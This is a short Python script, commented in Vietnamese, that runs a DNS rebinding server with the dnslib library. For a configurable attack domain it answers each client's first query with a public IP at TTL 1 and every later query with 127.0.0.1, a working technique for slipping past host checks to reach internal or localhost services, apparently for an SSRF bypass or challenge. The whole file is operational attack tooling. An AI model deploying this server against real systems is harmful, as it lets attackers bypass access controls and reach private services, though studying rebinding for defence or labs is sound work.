# dns_server.py
from dnslib import *
from dnslib.server import *

# --- CẤU HÌNH ---
# Thay thế bằng domain của bạn và IP của VPS
YOUR_DOMAIN = "attack.yourdomain.com." 
YOUR_VPS_IP = "YOUR_VPS_PUBLIC_IP" 
NASA_IP = "18.155.68.89" # IP NASA bạn đã ping
# ----------------

requests_count = {}

class RebindingResolver:
    def resolve(self, request, handler):
        reply = request.reply()
        qname = request.q.qname
        
        # Chỉ xử lý các request cho domain tấn công của chúng ta
        if qname == YOUR_DOMAIN:
            client_ip = handler.client_address[0]
            
            # Đếm số lần request từ một client IP
            count = requests_count.get(client_ip, 0)
            requests_count[client_ip] = count + 1

            if count == 0:
                # Lần đầu tiên: trả về IP NASA với TTL=1
                ip_to_return = NASA_IP
                ttl = 1
                print(f"[*] First request from {client_ip} for {qname}. Replying with NASA IP {ip_to_return} and TTL={ttl}")
            else:
                # Các lần sau: trả về 127.0.0.1
                ip_to_return = "127.0.0.1"
                ttl = 300
                print(f"[*] Subsequent request from {client_ip} for {qname}. Replying with localhost IP {ip_to_return}")

            reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip_to_return), ttl=ttl))
        else:
            # Nếu là request cho NS record, trỏ về chính nó
            if qname.endswith(YOUR_DOMAIN.rstrip('.')) and request.q.qtype == QTYPE.NS:
                 reply.add_answer(RR(qname, QTYPE.NS, rdata=NS(YOUR_DOMAIN), ttl=300))
            else:
                # Chuyển tiếp các request khác (không cần thiết nhưng hữu ích)
                reply.header.rcode = 2 # SERVFAIL

        return reply

print(f"[*] Starting DNS Rebinding Server for {YOUR_DOMAIN}")
print(f"[*] First response will be {NASA_IP} (TTL=1)")
print(f"[*] Subsequent responses will be 127.0.0.1")

logger = DNSLogger(prefix=False)
server = DNSServer(RebindingResolver(), port=53, address="0.0.0.0", logger=logger)
server.start()